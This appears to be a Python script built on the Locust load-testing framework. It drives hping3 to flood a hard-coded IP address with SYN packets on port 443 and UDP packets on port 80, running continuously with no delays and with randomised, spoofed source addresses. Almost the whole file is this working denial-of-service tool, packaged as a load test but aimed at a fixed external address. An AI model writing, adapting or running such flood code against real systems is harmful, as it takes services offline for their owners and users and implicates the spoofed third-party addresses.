from gevent import monkey
monkey.patch_all()

import time
import subprocess
from locust import User, task, constant, events

TARGET_IP   = "192.173.173.42"
TCP_PORT    = 443
UDP_PORT    = 80

# common hping flags
HpingBase = [
    "hping3",
    "--flood",       # no delays
    "--fast",        # override timing to max
    "--rand-source", # randomize src IP
]

class HpingUser(User):
    wait_time = constant(0)

    def _run_hping(self, args, name):
        """Run hping3 with args, measure duration & report via Locust events."""
        cmd = HpingBase + args
        start = time.time()
        try:
            # run for a short interval (e.g. 1s), then kill
            p = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(1)
            p.terminate()
            exception = None
        except Exception as e:
            exception = e
        elapsed = int((time.time() - start) * 1000)
        events.request.fire(
            request_type="HPING", name=name,
            response_time=elapsed, response_length=0,
            exception=exception
        )

    @task(7)
    def syn_flood(self):
        # TCP SYN to TARGET_IP:TCP_PORT at full blast
        args = ["-S", "-p", str(TCP_PORT), TARGET_IP]
        self._run_hping(args, "SYN-FLOOD")

    @task(3)
    def udp_flood(self):
        # UDP flood to TARGET_IP:UDP_PORT
        args = ["--udp", "-p", str(UDP_PORT), TARGET_IP]
        self._run_hping(args, "UDP-FLOOD")
